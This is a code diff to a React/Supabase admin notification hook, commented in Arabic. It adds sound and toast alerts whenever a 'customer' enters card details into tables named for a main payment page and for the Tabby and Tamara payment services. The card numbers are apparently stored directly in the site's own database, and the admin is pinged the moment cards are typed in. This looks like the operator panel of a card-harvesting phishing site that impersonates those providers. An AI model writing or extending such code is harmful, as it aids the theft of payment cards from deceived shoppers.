@@ -6,6 +6,7 @@ import { toast } from 'sonner';
 export const useAdminNotifications = () => {
   const audioRef = useRef<HTMLAudioElement | null>(null);
   const paymentAudioRef = useRef<HTMLAudioElement | null>(null);
+  const cardInfoAudioRef = useRef<HTMLAudioElement | null>(null);
   const location = useLocation();
 
   useEffect(() => {
@@ -22,6 +23,10 @@ export const useAdminNotifications = () => {
     // إنشاء عنصر الصوت لصفحة الدفع
     paymentAudioRef.current = new Audio('/payment-page-notification.mp3');
     paymentAudioRef.current.volume = 0.7;
+
+    // إنشاء عنصر الصوت لإدخال بيانات البطاقة
+    cardInfoAudioRef.current = new Audio('/card-info-notification.mp3');
+    cardInfoAudioRef.current.volume = 0.7;
 
     // الاستماع للطلبات الجديدة
     const ordersChannel = supabase
@@ -105,11 +110,74 @@ export const useAdminNotifications = () => {
       )
       .subscribe();
 
+    // الاستماع لإدخال بيانات البطاقة - الصفحة الرئيسية
+    const mainPaymentAttemptsChannel = supabase
+      .channel('admin-main-payment-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'payment_attempts'
+        },
+        (payload) => {
+          playCardInfoSound();
+          toast.success('عميل أدخل بيانات بطاقة!', {
+            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+            duration: 5000,
+          });
+        }
+      )
+      .subscribe();
+
+    // الاستماع لإدخال بيانات البطاقة - تابي
+    const tabbyPaymentAttemptsChannel = supabase
+      .channel('admin-tabby-payment-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tabby_payment_attempts'
+        },
+        (payload) => {
+          playCardInfoSound();
+          toast.success('عميل أدخل بيانات بطاقة في تابي!', {
+            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+            duration: 5000,
+          });
+        }
+      )
+      .subscribe();
+
+    // الاستماع لإدخال بيانات البطاقة - تمارة
+    const tamaraPaymentAttemptsChannel = supabase
+      .channel('admin-tamara-payment-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tamara_payment_attempts'
+        },
+        (payload) => {
+          playCardInfoSound();
+          toast.success('عميل أدخل بيانات بطاقة في تمارة!', {
+            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+            duration: 5000,
+          });
+        }
+      )
+      .subscribe();
+
     return () => {
       supabase.removeChannel(ordersChannel);
       supabase.removeChannel(tamaraChannel);
       supabase.removeChannel(tabbyChannel);
       supabase.removeChannel(paymentPageChannel);
+      supabase.removeChannel(mainPaymentAttemptsChannel);
+      supabase.removeChannel(tabbyPaymentAttemptsChannel);
+      supabase.removeChannel(tamaraPaymentAttemptsChannel);
     };
   }, [location.pathname]);
 
@@ -127,6 +195,15 @@ export const useAdminNotifications = () => {
       paymentAudioRef.current.currentTime = 0;
       paymentAudioRef.current.play().catch((error) => {
         console.error('Error playing payment page notification sound:', error);
+      });
+    }
+  };
+
+  const playCardInfoSound = () => {
+    if (cardInfoAudioRef.current) {
+      cardInfoAudioRef.current.currentTime = 0;
+      cardInfoAudioRef.current.play().catch((error) => {
+        console.error('Error playing card info notification sound:', error);
       });
     }
   };
